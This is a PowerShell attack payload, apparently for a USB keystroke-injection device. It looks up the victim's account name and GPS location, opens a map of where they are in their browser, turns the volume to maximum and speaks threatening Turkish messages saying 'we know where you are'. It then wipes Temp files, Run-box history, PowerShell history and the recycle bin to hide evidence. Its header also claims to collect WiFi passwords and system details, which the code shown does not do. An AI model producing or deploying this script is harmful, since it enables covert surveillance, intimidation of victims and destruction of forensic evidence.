<#
.NOTES
	The targets Location Services must be turned on or this payload will not work

.SYNOPSIS
	This script will get the users location and open a map of where they are in their browser and use windows speech to declare you know where they are  

.DESCRIPTION 
	This program gathers details from target PC to include Operating System, RAM Capacity, Public IP, and Email associated with microsoft account.
	The SSID and WiFi password of any current or previously connected to networks.
	It determines the last day they changed thier password and how many days ago.
	Once the information is gathered the script will pause until a mouse movement is detected
	Then the script uses Sapi speak to roast their set up and lack of security
#>

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

<#

.NOTES 
	This is to get the Name associate with the targets microsoft account, if not detected UserName will be used 
#>

function Get-fullName {

    try {

    $fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")

    }
 
 # If no name is detected function will return $env:UserName 

    # Write Error is just for troubleshooting 
    catch {Write-Error "No name was detected" 
    return $env:UserName
    -ErrorAction SilentlyContinue
    }

    return $fullName 

}

$FN = Get-fullName

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

<#

.NOTES 
	This is to get the current Latitide and Longitude of your target
#>

function Get-GeoLocation{
	try {
	Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
	$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
	$GeoWatcher.Start() #Begin resolving current locaton

	while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
		Start-Sleep -Milliseconds 100 #Wait for discovery.
	}  

	if ($GeoWatcher.Permission -eq 'Denied'){
		Write-Error 'Access Denied for Location Information'
	} else {
		$GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevent results.
		
	}
	}
    # Write Error is just for troubleshooting
    catch {Write-Error "No coordinates found" 
    return "No Coordinates found"
    -ErrorAction SilentlyContinue
    } 

}

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

<#

.NOTES 
	This is to pause the script until a mouse movement is detected
#>

function Pause-Script{
Add-Type -AssemblyName System.Windows.Forms
$originalPOS = [System.Windows.Forms.Cursor]::Position.X
$o=New-Object -ComObject WScript.Shell

    while (1) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
            break
        }
        else {
            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
        }
    }
}

#-----------------------------------------------------------------------------------------------------------------------------------------------------------

$GL = Get-GeoLocation

$GL = $GL -split " "

$Lat = $GL[0].Substring(11) -replace ".$"

$Lon = $GL[1].Substring(10) -replace ".$"

Pause-Script

# Opens their browser with a map of their current location

Start-Process "https://www.latlong.net/c/?lat=$Lat&long=$Lon"

Start-Sleep -s 3

# Sets Volume to max level

$k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}

# Sets up speech module 

$s=New-Object -ComObject SAPI.SpVoice
$s.Rate = -2
$s.Speak("seni bulduk $FN")
$s.Speak("neredesin biliyoruz")
$s.Speak("biz her yerdeyiz")
$s.Speak("bütün bilgilerin elimizde")


#-----------------------------------------------------------------------------------------------------------------------------------------------------------

<#

.NOTES 
	This is to clean up behind you and remove any evidence to prove you were there
#>

# Delete contents of Temp folder 

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin

Clear-RecycleBin -Force -ErrorAction SilentlyContinue
